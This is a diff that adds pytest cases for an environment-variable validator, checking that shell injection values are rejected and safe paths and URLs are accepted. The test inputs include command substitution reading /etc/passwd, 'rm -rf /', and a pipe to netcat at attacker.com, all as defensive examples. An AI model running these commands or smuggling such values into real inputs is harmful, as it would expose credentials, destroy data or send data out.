@@ -564,6 +564,53 @@ class TestEnvironmentVariableValidation:
         assert key == "PASSWORD"
         assert value == "pass123"
 
+    def test_validate_environment_variable_command_substitution(self) -> None:
+        """Test rejecting environment variables with command substitution."""
+        with pytest.raises(ValidationError, match="dangerous character.*\\$\\("):
+            validate_environment_variable("MALICIOUS", "$(cat /etc/passwd)")
+
+    def test_validate_environment_variable_backtick_substitution(self) -> None:
+        """Test rejecting environment variables with backtick substitution."""
+        with pytest.raises(ValidationError, match="dangerous character.*`"):
+            validate_environment_variable("MALICIOUS", "`cat /etc/passwd`")
+
+    def test_validate_environment_variable_semicolon(self) -> None:
+        """Test rejecting environment variables with command separator."""
+        with pytest.raises(ValidationError, match="dangerous character.*;"):
+            validate_environment_variable("MALICIOUS", "value; rm -rf /")
+
+    def test_validate_environment_variable_ampersand(self) -> None:
+        """Test rejecting environment variables with background execution."""
+        with pytest.raises(ValidationError, match="dangerous character.*&"):
+            validate_environment_variable("MALICIOUS", "value & malicious_command")
+
+    def test_validate_environment_variable_pipe(self) -> None:
+        """Test rejecting environment variables with pipe."""
+        with pytest.raises(ValidationError, match="dangerous character.*\\|"):
+            validate_environment_variable("MALICIOUS", "value | nc attacker.com 1234")
+
+    def test_validate_environment_variable_newline(self) -> None:
+        """Test rejecting environment variables with newline injection."""
+        with pytest.raises(ValidationError, match="dangerous character"):
+            validate_environment_variable("MALICIOUS", "value\nmalicious_command")
+
+    def test_validate_environment_variable_carriage_return(self) -> None:
+        """Test rejecting environment variables with carriage return."""
+        with pytest.raises(ValidationError, match="dangerous character"):
+            validate_environment_variable("MALICIOUS", "value\rmalicious_command")
+
+    def test_validate_environment_variable_safe_special_chars(self) -> None:
+        """Test allowing environment variables with safe special characters."""
+        # These should be allowed (common in paths, URLs, etc.)
+        key, value = validate_environment_variable("PATH", "/usr/bin:/usr/local/bin")
+        assert value == "/usr/bin:/usr/local/bin"
+
+        key, value = validate_environment_variable("URL", "https://example.com/path?query=value")
+        assert value == "https://example.com/path?query=value"
+
+        key, value = validate_environment_variable("FLAGS", "--option=value --flag")
+        assert value == "--option=value --flag"
+
 
 class TestConstants:
     """Test safety constants."""
